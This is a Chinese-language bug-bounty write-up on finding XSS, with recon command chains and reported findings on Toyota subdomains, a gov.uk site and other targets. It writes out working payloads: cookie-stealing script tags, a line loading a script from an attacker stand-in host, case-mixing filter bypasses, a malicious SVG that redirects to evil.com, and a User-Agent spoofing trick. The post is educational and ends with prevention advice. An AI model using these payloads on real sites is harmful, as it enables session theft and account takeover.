#  使用未知技术发现多个 XSS 漏洞   
原创 星空浪子  星空网络安全   2024-11-24 04:08  
  
今天我将讨论使用不同技术的多种 XSS 攻击，这是我在各种漏洞赏金计划中发现的。  
  
XSS：（跨站点脚本）  
是一种安全漏洞，当攻击者将恶意脚本注入其他用户查看的网页时就会发生这种情况。XSS 攻击旨在在受害者浏览器的上下文中执行恶意脚本，从而允许攻击者窃取敏感信息。例如，在 javascript 编程语言中，如果攻击者可以注入类似  
  
  
```
<script src= https://attacker_Server.com/attack.js > </script> 
// 从攻击者服务器加载恶意 Java 脚本文件，执行恶意操作，例如窃取受害者的敏感数据（如会话 cookie）并接管帐户。
```  
  
# ** XSS 的类型？  
  
1] 反射型 XSS：  
是最简单的 XSS 类型。当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在响应中时，就会发生这种情况。  
例如：  
如果我们在网站中有一个用于过滤服装的类别参数，例如“   
https://example.com?category=t-shirt  
 ”，并且该值以不安全的方式反映在响应中，<p>t-shirt</p>  
这意味着我们可以注入我们的有效载荷，例如<p><script>alert(document.cookie)</script></p>  
获取会话 cookie。  
  
2] DOM XSS：  
当 JavaScript 从攻击者可控制的  
源  
（例如 URL）获取数据并将其传递给支持动态代码执行的  
接收器  
（例如eval()  
   
或 ）时，就会发生这种情况innerHTML  
。这使攻击者能够执行恶意的 JavaScript，您需要深入了解 DOM 的最重要的事情是  
源  
和  
接收器。  
有关源和接收器的更多信息，请查看  
portswigger  
。  
  
  
  
3] 存储型 XSS：  
当应用程序从不受信任的来源接收数据，并在其后续 HTTP 响应中不安全地包含该数据时，就会发生这种情况。  
例如：  
假设一个网站允许用户  
对向其他用户显示的博客文章发表  
评论。  
  
攻击者  
提交恶意评论，这些评论将存储  
在   
服务器  
上   
，当其他用户看到这些恶意评论时，攻击者就会  
窃取他们的数据  
。  
  
  
  
  
关于XSS的信息越来越多，但我会在文章最后分享一些参考资料，现在是时候发现错误了。  
# ** XSS 漏洞：  
## * 丰田公司存在严重 DOM XSS::  
  
$Keys$:  
自动化工具 [gau+dalfox+etc..]  
  
现在，我们有一个丰田域名，我们需要为该域名收集子域名。您可以使用  
sublist3r  
 —   
subfinder  
 —   
asset finder  
 —   
amass  
 -.. 等工具，然后  
使用用于获取实时子域名的  
httpx过滤这些子域名。  
  
```
httpx -l 子域名.txt -o httpx.txt
```  
  
现在让我们从Wayback Machine  
和  
Common Crawl  
收集端点  
```
echo "toyota.com" | gau --threads 5 >> Enpoints.txt
```  
```
cat httpx.txt | katana -jc >> Enpoints.txt
```  
  
gau  
：  
一种从 Wayback Machine 获取任何域名的已知 URL 的工具。  
  
katana：  
是一款专注于深度网络爬虫的强大工具。  
  
uro：  
一个很好的工具，用于从收集的端点过滤无趣/重复的内容，例如，如果我们有多个 URL，如  
https://example.com?id=1  
和  
https://example.com?id=2，  
则会将它们过滤为  
仅一个 URL。  
  
否  
注意：  
您可以像大多数安全研究人员一样，使用您正在使用的工具通过  
自动化脚本  
自动执行所有前面的操作  
，以简化流程  
，我将在以后的文章中分享我的脚本。  
  
现在，我们有很多端点，我们需要对它们进行过滤以便工作。我正在使用很棒的  
gf  
工具，它根据提供的模式  
   
过滤端点  
，例如，有针对 XSS、SQLi、SSRF 等的模式……您可以使用 GitHub 中的任何公共模式，例如  
这个  
，并将它们添加到“   
~/.gf  
 ”目录中。  
  
```
cat Endpoints_F.txt | gf xss >> XSS.txt 
# 用于获取具有可能易受 XSS 攻击的参数的端点
```  
  
然后我们将使用  
Gxss  
工具来查找  
其  
值  
反映  
在响应中的  
参数  
。  
```
cat XSS.txt | Gxss -p khXSS -o XSS_Ref.txt
```  
  
在此过程中  
，您有两个选择：第一种是手动测试，或者使用 XSS 自动化工具并手动确认结果。我们的文件很大，所以我会使用  
Dalfox  
自动化 XSS 扫描器  
  
```
dalfox 文件 XSS_Ref.txt -o Vulnerable_XSS.txt
```  
  
我发现有一个存在漏洞的子域名，我们将其称为  
sub.toyota.com，  
所以让我们来看看发生了什么。  
  
当我导航到存在漏洞的 URL [   
https://sub.toyota.com   
/direcrory/  
 ?dir=%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E  
 ] 时，我收到了一条弹出消息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/n4Jw29uPBicmIt3uQrsibXuK7iafNoTrjfCypRzhVXU4NfxRJJkhm2NBXIp4VBMPKFrSkEqjicfc5HMh7XrhRqC8MA/640?wx_fmt=png&from=appmsg "")  
  
当时  
我就在想，这是否是唯一一个易受攻击的参数，还是还有其他参数，以及为什么会出现这种情况。我发现了很多易受攻击的参数。  
  
我查看了响应，发现存在漏洞的参数存在于 URL[   
source  
 ] 中，存在于不同的 Java 脚本变量中，例如  
“var returnUrl=”、   
“var applicationUri=”  
。你可以通过查看此 Javascript 代码来理解其中的原理。  
```
<script> 
  // 假设 URL 是 http://test.com?param=test 
  var urlParams = new  URLSearchParams ( window . location . search ); 
  var paramValue = urlParams.get('param' ); // 这将执行 paramValue 变量中的脚本标签 document.write ( paramValue ) </script> //
  
  如果
  查看代码，您将看到添加到参数中的值没有经过任何清理。

```  
  
让我们发送以下 URL 来了解目标是否有任何针对 cookie 的保护。[   
https://sub.toyota.com   
/direcrory/  
 ?dir=%3C%2Fscript%3E%3Cscript%3Econfirm%28document.cookie%29%3C%2Fscript%3E  
 ]  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/n4Jw29uPBicmIt3uQrsibXuK7iafNoTrjfCu0zaR9N5ZaSUy7LXOGwDcPtYxcx5C70Bzgkt4pb8lQtgooF5zT5WYA/640?wx_fmt=png&from=appmsg "")  
  
不幸的是  
，这意味着我可以对任何用户执行完全帐户接管[   
RXSS  
 ]。我详细地报告了该漏洞，并且被接受了🙂。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/n4Jw29uPBicmIt3uQrsibXuK7iafNoTrjfCbdRicIo3RKHmaYH1IeZf96nAH9aU8ib7iaOAXuySjkUhNGlbBclEUTqlQ/640?wx_fmt=png&from=appmsg "")  
## * 漏洞赏金计划中的中等反射型XSS($$$)::  
  
$Keys$:  
隐藏参数  
—  
手动测试  
  
反射型 XSS  
是最常见的错误之一，并且很容易发现，但我将讨论  
我多次遇到的  
具体错误。  
  
在完成侦察并收集了所有有关  
targets.com  
的相关信息后，我收集了端点。我在[   
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php  
 ]发现了一个非常有趣的端点。它给了我以下页面。  
  
  
当我导航到基本 URL 时，我收到了  
403 Forbidden  
。  
  
  
我使用自定义单词表和  
dirsearch  
工具来模糊测试基本 URL 和其他端点。  
```
dirsearch -u https://tst2.dev.targets.com/ -w wordlist.txt -e php,cgi,htm,html,shtm,shtml,js,txt --random-agent 
# (-u) 用于目标 && (-w) 用于与工具一起使用的自定义单词列表 && (-e) 用于与工具一起使用的不同扩展 && (--random-agent) 用于更改请求的用户代理
```  
  
但我没有得到任何重要的东西，但  
等等  
，隐藏参数怎么办  
？  
让我们  
使用  
Arjun  
工具  
或  
param miner  
扩展扫描 [   
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php  
 ] ，它们用于使用不同的请求（如 GET、POST、JSON 和 XML）对 URL 进行模糊测试，以找到有效的查询。  
```
arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -w Parameters_Fuzz.txt 
# (-u) 用于我们的目标 && (-m GET) 使用 GET 方法发送请求 && (-w) 用于与工具一起使用的自定义单词表
```  
  
响应  
  
  
因此，让我们研究不同注入（如 XSS、SQLi 等）的  
auth_status 参数  
。但为了不浪费时间，我不会讨论所有注入，我将重点讨论反射型 XSS。  
  
当我在参数值中注入  
khxss时，当我导航到 [   
  
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3Cscript%3Econfirm%285%29%3C%2Fscript%3E  
 ] 以了解服务器如何处理请求  
时，它会反映在响应中。我得到了  
403 Forbidden。  
  
绕过某些保护措施的第一个也是最简单的方法就是尝试操纵有效载荷，例如改变编写有效载荷的方式（如（  
<sCrIpT>alert(1)</ScRipt>  
）或（  
<scr<script>ipt>  
）或多种技术[  
因为开发人员在仅将特定单词列入黑名单时会犯错误  
]。你可以使用公共单词列表自动执行此操作，但是当我发现 [   
https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E  
 ] 时，它  
接受了  
，我们得到了  
XSS  
。  
  
  
这不是最终的结果 :)  
，当您发现任何类似的东西时，请尝试查看子域名是否容易受到相同错误的攻击，这就是我在收集 [ *   
.dev.targets.com  
 ] 的子域名时所做的，我发现了大约  
四个易受攻击的  
子域名，但是当我报告它们时，分类团队将它们视为一个漏洞接受，我最终获得了  
赏金  
🙂。  
  
  
否  
注意  
：您可以使用  
ffuf  
工具对带有完整 URL 的子域名进行模糊测试，方法是：  
```
ffuf -u "https://FUZZ.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=%3CsCriPt%3Econfirm%28documen.cookie%29%3C%2FScRipt%3E" -w subdomains.txt -c -v
```  
## * 通过 SVG 文件上传来的高存储 XSS：  
  
$keys$：  
文件上传——手动测试。  
  
侦察结束后，我查找了  
用于获取子域名  
截图的  
aquatone  
结果。我发现了一个有趣的子域名，所以让我们开始研究它吧。  
  
  
URL   
https://sub.gov.uk/  
是我们的目标。当您开始对目标进行测试时，您必须了解目标的所有功能，例如 [  
注册  
-  
登录  
-  
忘记密码  
-  
等等  
..]  
  
当我在注册表上  
创建账户  
时，我发现需要填写一些内容，例如  
用户名、电子邮件、密码、组织名称以及添加与制造商的关联  
。  
  
让我们在  
用户名输入  
中添加一个有效载荷，例如  
```
"> < img  src = x  onerror = alert(document.domain) > {{7*7}}' 
<!--> 如果你查看之前的有效载荷，你会发现它正在测试不同的漏洞，如 [img 标签用于测试 XSS。你也可以使用你的 XSS 猎人有效载荷] - [{{7*7}} 用于测试 SSTI] - [' 用于测试 SQLi]<-->
```  
  
在我们填写所有空输入之前，我们无法知道它是否存在漏洞，所以让我们完成，  
但是等等，  
我不能，因为用户名具有针对恶意单词的安全性。我们可以使用不同的技术来操纵它，例如更改有效载荷 - 对内容或其他内容进行编码，但让我们看看所有输入是否都具有相同的保护。组织字段有多个内容需要填写，例如  
组织名称、地址、国家/地区等  
。当我将有效载荷添加到  
组织名称时。  
  
  
它被接受了并且我们的 XSS 负载被执行了。  
  
  
好的，我没有在这里停下来，因为有很多东西需要测试，但我会重点关注  
关系表单中的  
文件上传  
功能字段  
。  
  
> 文件上传漏洞：  
当网站允许用户在未对  
输入进行  
适当  
验证  
或清理的  
情况下上传文件  
时，就会出现文件上传漏洞。这可能导致各种安全问题，包括执行恶意脚本或上传有害文件，从而危害系统或窃取敏感信息。  
  
  
  
  
  
  
当你开始测试文件上传漏洞时，有很多事情要做，所以我建议阅读以下文章，了解大多数文件上传漏洞技术  
。  
但我们将重点关注  
SVG 文件  
。  
> 什么是 SVG：  
可缩放矢量图形 (SVG) 是一种  
基于 XML 的  
矢量图像格式，可以包含交互式和动画图形。SVG 文件还可以  
包含 JavaScript 代码  
，可用于各种任务，包括动画。由于 SVG 文件可以在 HTML 中被视为图像，因此可以将它们放在图像标签中，并完美呈现。例如<img src="rectangle.svg" alt="Rectangle" height="20" width="30">  
  
  
SVG文件  
（"rectangle.svg"  
）  
可能类似于以下内容  
```
< svg  width = "200"  height = "100"  xmlns = "http://www.w3.org/2000/svg" > 
  < rect  x = "20"  y = "20"  width = "160"  height = "60"  fill = "blue" /> 
</ svg > 
<!-->用于创建蓝色矩形的 SVG 文件<-->
```  
  
我能够上传一个  
包含  
恶意脚本的  
SVG 文件  
，该文件未经正确清理，导致脚本执行。  
  
  
以下是  
我创建的  
恶意 SVG文件  
```
<?xml version= "1.0" standalone= "no" ?> 
<!DOCTYPE svg  PUBLIC  "-//W3C//DTD SVG 1.1//EN"  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" > 
< svg  version = "1.1"  baseProfile = "full"  xmlns = "http://www.w3.org/2000/svg" > 
   < rect  width = "300"  height = "100"  style = "fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> 
   < script  type = "text/javascript" > 
      alert("您已被黑客入侵！！" + "\n" + "域：" + document.domain + "\n" + "Cookie：" + document.cookie ); 
      window.location.href="https://evil.com" 
   </ script > 
</ svg >
```  
  
让我们上传它  
  
  
我  
导航  
到文件  
  
  
向上  
，我们将收到存储的XSS。  
  
  
我详细地报告了该漏洞，并且被  
接受了  
:)。  
  
## * 带有未知技术的XSS：  
  
$keys$：  
 robots.txt - 用户代理 - Burp Suite。  
  
假设我们有  
https://targets.com  
。  
我搜索了它，但只找到  
一个页面  
，它给出了  
内部错误。没有什么重要的。当我进行模糊测试时，除了以下  
  
robots.txt 文件  
外，什么也没有  
：  
  
  
如果你是一名  
CTF 玩家  
或者曾经玩过  
CTF  
，那么下面这些  
想法  
很正常。  
  
如果我转到  
/settings 页面  
并  
用响应中看到的值  
替换  
请求  
中的  
User   
-Agent，会发生什么？  
  
  
  
  
当我使用Burp Suite  
拦截请求  
并将  
User-Agent  
   
更改  
为  
Mediapartners-Google  
时，我没有发现  
/settings  
页面  
的任何内容，但我发现了很多可接受的页面，说我们现在有了一个完整的新 Web 应用程序。我没想到会有这样的事情发生，我觉得  
  
就像我们正在研究的大多数目标一样，  
手动  
和  
自动化  
方法是我们的关键。  
  
运行  
Burp Suite 扫描  
后，我发现了一些有用的发现，其中之一是  
XSS 漏洞  
。以下是有关我发现的漏洞的所有详细信息。  
  
进入  
Burp Suite：-> 代理-> 拦截  
  
  
转到  
拦截  
部分  
的  
选项  
  
  
  
  
进行  
匹配和替换，  
然后将  
用户代理  
替换为新的（  
Mediapartners-Google  
），以拦截所有请求  
  
  
转到我们的易受攻击的 URL   
https://targets.com  
 /   
/bundle/cardjdv1i”><script>alert(document.cookie)</script>mnybm?id=25020×tamp=1704865352  
 ]  
  
我们得到了  
XSS  
。  
  
  
当我再次更改  
User-Agent  
来确认错误配置是否来自它时，我没有得到任何东西，所以现在是时候报告我们的漏洞了。  
  
查找以下代码以  
了解  
可能发生的情况  
```
// 这只是一个简单的 Java Script 代码示例，而不是实际代码
<html> 
  < body > 
    < p >这个< span  id = "exampleElement" > </ span > </ p > 
  </ body > 
  < script > 
    // 从请求中获取 User-Agent 值
    var userAgent = navigator. userAgent ; 
    
    // 检查 User-Agent 值是否为“Mediapartners-Google” 
    if (userAgent. indexOf ( "Mediapartners-Google" ) !== - 1 ) { 
      // 假设 URL 为 https://targets.com/bundle/<user-input>/ 
      var userInput = window . location . pathname . split ( "/" )[ 2 ]; 
      document . getElementById ( "exampleElement" ). innerHTML = userInput; 
    } 
  </ script > 
</ html >
```  
  
当我报告它时。它没有被接受，因为子域超出了范围，但我不在乎，因为这是一种未知的技术，我想告诉你，你不能放弃你得到的一切并努力工作。  
# 如何预防XSS漏洞[保护]:  
  
在本节中，我们将简要讨论开发人员如何保护他们的网站免受 XSS 攻击：  
  
1] 验证和清理输入：  
始终验证和清理用户输入，以防止恶意脚本的注入。  
  
2] 使用内容安全策略（CSP）：  
 CSP 是一种安全功能，有助于防止跨站点脚本和其他代码注入攻击。  
  
3] 输出编码：  
输出用户提供的数据时，对其进行编码，以防止浏览器将其解释为 HTML。  
  
4] 实施 WAF（Web 应用程序防火墙）：  
 WAF 可以帮助过滤恶意请求并防止 XSS 攻击。  
  
  
  
希望这些信息对您有所帮助！如果觉得这篇文章有价值，  
**欢迎点赞、分享、再看、转载**  
**，**如果您有网络安全的疑问，联系我随时为您解答，感谢您的支持！  
  
